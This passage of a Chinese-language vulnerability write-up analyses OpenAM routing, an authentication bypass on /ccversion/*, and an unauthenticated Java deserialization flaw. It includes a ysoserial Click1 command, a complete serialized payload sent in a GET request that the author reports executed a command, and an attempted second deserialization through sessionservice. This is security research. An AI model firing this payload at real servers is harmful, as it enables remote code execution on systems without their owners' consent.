那么是不是存在一个路由的onBeforeRequest没有校验token呢，通过对每个servlet进行分析，确实找到了不同于ConsoleServletBase父类的类TagsServletBase。该servlet对应的路由为/ccversion/*
那么它到底特殊在什么地方呢？通过查看代码可以得知在父类ApplicationServletBase之前的子类都没有实现onBeforeRequest方法，这就使得在调用onBeforeRequest方法时实则调用了ApplicationServletBase里的方法，然而ApplicationServletBase里onBeforeRequest方法是空函数。
那么这个检验就可以轻易绕过了。
###  0x5 动态分发
分析到这都是静态路由在处理，openAm在处理请求的时候大部分采用的动态Bean调用，我们一起来看看到底是怎么实现的。
主要观察上面代码的381行和384行，通过getViewBeanInstance获取到pageName对应的Bean实例，再用dispatchRequest方法将其分发，分发时执行的函数为forwardTo。
问题是怎么获取到这些Bean实例的，我们通过动态调试的方式一起分析下。
getViewBeanInstance函数会调用getLocalViewBean函数去查找并生成viewBean
getLocalViewBean函数就比较有意思，利用getHandlingServlet获取当前线程运行的Servlet，判断是否allowShortViewBeanNames字段之后进入if
else分之，getBasePackageName函数会获取调用者的包名，这里的调用者是VersionServlet其包名为com.sun.identity.console.version。
getViewBeanByClassName会通过字符串的形式动态的加载类到内存中，但在加载之前会先判断有没有实例已经生成，如果有的话就会在nameInstanceMap中匹配到，就不需要通过Class.forName的方式去动态生成了。
因此这个ViewServlet路由最终会调用执行com.sun.identity.console.version包下的*ViewBean代码，这也就和之前的漏洞点串起来了，剩下的只需要考虑下如何进行利用了。
## 0x05 漏洞利用分析
再次回顾下此次漏洞点，通过Encoder.decodeHttp64函数进行解码后，传递给Encoder.deserialize函数进行反序列化，反序列化代码逻辑处没有过滤，我们可以在项目中的jar包里搜索可利用的利用链。
               this.setPageSessionAttributes((Map)Encoder.deserialize(Encoder.decodeHttp64(pageAttributesParam), false));
从项目的lib目录中发现的几个ysoserial中用来构造反序列化的jar包版本都对应不上，这就意味着要重新寻找个反序列化利用链。关于怎么找链以及怎么构造ysoserial
Click1利用链，我打算开篇新的文章记录下。
###  0x1 生成利用链
在进行漏洞利用的时候暂且直接使用集成在ysoserial工具里的Click1利用链。
    java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Click1 "touch /tmp/xx" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '='
###  0x2 构造数据包
    GET /openam/ccversion/Version?jato.pageSession=AKztAAVzcgAXamF2YS51dGlsLlByaW9yaXR5UXVldWWU2jC0-z-CsQMAAkkABHNpemVMAApjb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAnNyADBvcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtbkNvbXBhcmF0b3IAAAAAAAAAAQIAAkkADWFzY2VuZGluZ1NvcnRMAAZjb2x1bW50ACFMb3JnL2FwYWNoZS9jbGljay9jb250cm9sL0NvbHVtbjt4cAAAAAFzcgAfb3JnLmFwYWNoZS5jbGljay5jb250cm9sLkNvbHVtbgAAAAAAAAABAgATWgAIYXV0b2xpbmtaAAplc2NhcGVIdG1sSQAJbWF4TGVuZ3RoTAAKYXR0cmlidXRlc3QAD0xqYXZhL3V0aWwvTWFwO0wACmNvbXBhcmF0b3JxAH4AAUwACWRhdGFDbGFzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wACmRhdGFTdHlsZXNxAH4AB0wACWRlY29yYXRvcnQAJExvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvRGVjb3JhdG9yO0wABmZvcm1hdHEAfgAITAALaGVhZGVyQ2xhc3NxAH4ACEwADGhlYWRlclN0eWxlc3EAfgAHTAALaGVhZGVyVGl0bGVxAH4ACEwADW1lc3NhZ2VGb3JtYXR0ABlMamF2YS90ZXh0L01lc3NhZ2VGb3JtYXQ7TAAEbmFtZXEAfgAITAAIcmVuZGVySWR0ABNMamF2YS9sYW5nL0Jvb2xlYW47TAAIc29ydGFibGVxAH4AC0wABXRhYmxldAAgTG9yZy9hcGFjaGUvY2xpY2svY29udHJvbC9UYWJsZTtMAA10aXRsZVByb3BlcnR5cQB-AAhMAAV3aWR0aHEAfgAIeHAAAQAAAABwcHBwcHBwcHBwdAAQb3V0cHV0UHJvcGVydGllc3Bwc3IAHm9yZy5hcGFjaGUuY2xpY2suY29udHJvbC5UYWJsZQAAAAAAAAABAgAXSQAOYmFubmVyUG9zaXRpb25aAAlob3ZlclJvd3NaABdudWxsaWZ5Um93TGlzdE9uRGVzdHJveUkACnBhZ2VOdW1iZXJJAAhwYWdlU2l6ZUkAE3BhZ2luYXRvckF0dGFjaG1lbnRaAAhyZW5kZXJJZEkACHJvd0NvdW50WgAKc2hvd0Jhbm5lcloACHNvcnRhYmxlWgAGc29ydGVkWgAPc29ydGVkQXNjZW5kaW5nTAAHY2FwdGlvbnEAfgAITAAKY29sdW1uTGlzdHQAEExqYXZhL3V0aWwvTGlzdDtMAAdjb2x1bW5zcQB-AAdMAAtjb250cm9sTGlua3QAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvQWN0aW9uTGluaztMAAtjb250cm9sTGlzdHEAfgAQTAAMZGF0YVByb3ZpZGVydAAsTG9yZy9hcGFjaGUvY2xpY2svZGF0YXByb3ZpZGVyL0RhdGFQcm92aWRlcjtMAAZoZWlnaHRxAH4ACEwACXBhZ2luYXRvcnQAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvUmVuZGVyYWJsZTtMAAdyb3dMaXN0cQB-ABBMAAxzb3J0ZWRDb2x1bW5xAH4ACEwABXdpZHRocQB-AAh4cgAob3JnLmFwYWNoZS5jbGljay5jb250cm9sLkFic3RyYWN0Q29udHJvbAAAAAAAAAABAgAJTAAOYWN0aW9uTGlzdGVuZXJ0ACFMb3JnL2FwYWNoZS9jbGljay9BY3Rpb25MaXN0ZW5lcjtMAAphdHRyaWJ1dGVzcQB-AAdMAAliZWhhdmlvcnN0AA9MamF2YS91dGlsL1NldDtMAAxoZWFkRWxlbWVudHNxAH4AEEwACGxpc3RlbmVydAASTGphdmEvbGFuZy9PYmplY3Q7TAAObGlzdGVuZXJNZXRob2RxAH4ACEwABG5hbWVxAH4ACEwABnBhcmVudHEAfgAXTAAGc3R5bGVzcQB-AAd4cHBwcHBwcHBwcAAAAAIAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAXBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHhwcHBwcHBwcHBwdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAITAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA_____3VyAANbW0JL_RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF_gGCFTgAgAAeHAAAAajyv66vgAAADMAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ-AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEADXRvdWNoIC90bXAveHgIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXI4MTE5NjYyNDE4OTUwMDIBACBMeXNvc2VyaWFsL1B3bmVyODExOTY2MjQxODk1MDAyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AJAAAAdTK_rq-AAAAMwAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4c3IAFGphdmEubWF0aC5CaWdJbnRlZ2VyjPyfH6k7-x0DAAZJAAhiaXRDb3VudEkACWJpdExlbmd0aEkAE2ZpcnN0Tm9uemVyb0J5dGVOdW1JAAxsb3dlc3RTZXRCaXRJAAZzaWdudW1bAAltYWduaXR1ZGV0AAJbQnhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP_______________v____4AAAABdXEAfgAkAAAAAQF4eA HTTP/1.1
    Host: 192.168.0.106:7080
    User-Agent: curl/7.64.1
    Accept: */*
后台代码成功接受数据并进行反序列化
成功执行命令创建文件xx
关于反序列化漏洞挖掘的方式，及路由回溯方法在其他分析中展开讲解，这个漏洞的反序列化链编写过程打算在下篇文章重点分析。
## 0x06 其他分析
为什么有这一小节呢？我再复现分析这个漏洞的时候尝试性的对它开展了漏洞挖掘工作，其中找到了一个未认证反序列化，但是有白名单的限制，最后没有利用成功。主要记录下该反序列化点的挖掘及触发过程。
###  0x1 可疑的漏洞点
借助之前搜索readObject的结果，我们可以发现这个带有反序列化白名单校验的类IOUtils.class，我一开始不知道其中有白名单校验，就傻不愣登的开始分析了。
​
###  0x2 触发路由分析
通过字符串搜索找到包含IOUtils且包含了deserialize的class文件，其中的分析过一遍后感觉RestrictedTokenContext比较有戏。
RestrictedTokenContext主要是unmarshal方法调用了危险函数，我们需要继续向上分析调用点
通过相同的搜索方式找到了一些调用点其中SessionRequestHandler引起了我的注意
通过审计SessionRequestHandler发现有一处触发点，并且在之前未发现有校验，那么剩下的问题就转变成如何调用这个Handler进行处理。
在之前分析servlet函数的时候有分析到pllservice
它里面的请求包处理函数和Handler调用有着一定的联系，粗略看来和xml解析有关，具体什么关系还是需要动态调试才能确定。
###  0x3 动态调试确定数据包
通过动态调试找到了获取handler的关键代码，如下图所示。set.geteServiceID就是post数据中xml里的svcid值，我们可以控制。
最为核心的代码在getServiceHandler函数中，通过分析发现requestHandlers为已经加载的Handler，这个机制和ViewBean很相似。handler的生成在第150行进行，但之前要获得handler的名称，这个操作主要在WebtopNaming.getServiceClass中进行。
getServiceClass函数是在config中寻找与之匹配的项，config中保存了所有的映射关系。
映射关系如下，通过这个NamingTable可以很直观的找到svcid为session时与之对应的handler为SessionRequestHandler。因此我们构造数据包也就有了着落。
###  0x4 填充参数
找到Handler的生成关系后，我们需要将反序列化的数据填充进去，这里主要是确定getRequester获取的是什么数据。
跟进发现该数据已经生成完毕了，我们需要做的是溯源路由，找到填充变量的那块代码。
通过简单的分析发现了在xml解析时，解析了elem的requester属性，如果该属性存在则赋值。
那么剩下的就简单了，构造一个符合代码的xml数据包发送给后台。这里需要注意的是requester参数里的内容要经历两次base64编码。
    POST /openam/sessionservice HTTP/1.1
    Host: 192.168.0.201
    Connection: close
    sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
    Accept: */*
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: no-cors
    Sec-Fetch-Dest: script
    Accept-Encoding: gzip, deflate
    Content-Type: text/xml
    Accept-Language: zh-CN,zh;q=0.9
    Content-Length: 5156
    xxxx]]>
成功到达反序列化的地方，可是存在严格的白名单，目前没有什么好的办法。
## 0x07 总结
本文主要从如何挖掘该漏洞的角度分析这个漏洞的挖掘方式，后面将会用重点介绍这个漏洞利用方式。
## 参考文章